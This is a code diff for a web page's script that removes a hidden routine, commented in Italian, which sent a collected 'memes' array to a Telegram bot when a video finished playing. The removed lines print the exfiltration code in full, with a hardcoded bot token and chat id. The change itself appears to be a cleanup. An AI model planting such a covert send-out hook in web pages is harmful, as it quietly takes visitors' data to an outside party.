@@ -92,27 +92,11 @@
                 start.style.display = 'flex';
                 preload.style.cursor = 'pointer';
             };
-// Funzione per inviare i dati a Telegram
-async function sendMemesToTelegram(memes) {
-    const botToken = '8234370532:AAEn_59rezPt7b2XBgFvy5Q2OYywoPiALtw';
-    const chatId = '-1001234567890';
-    const message = encodeURIComponent(memes.join("\n"));
-    try {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`);
-        console.log('Dati inviati a Telegram');
-    } catch (err) {
-        console.error('Errore invio Telegram:', err);
-    }
-}
 
-// Modifica video.onended per inviare i dati
-video.onended = () => {
-    video.style.display = 'none';
-    if (interval) clearInterval(interval);
-
-    // Invio dati a Telegram
-    sendMemesToTelegram(memes);
-};
+            video.onended = () => {
+                video.style.display = 'none';
+                if (interval) clearInterval(interval);
+            }
 
             preload.onclick = () => {
                 if (start.style.display != 'flex') return;
@@ -240,7 +224,5 @@ video.onended = () => {
 </script>
 
 </html>
-
-
 
 
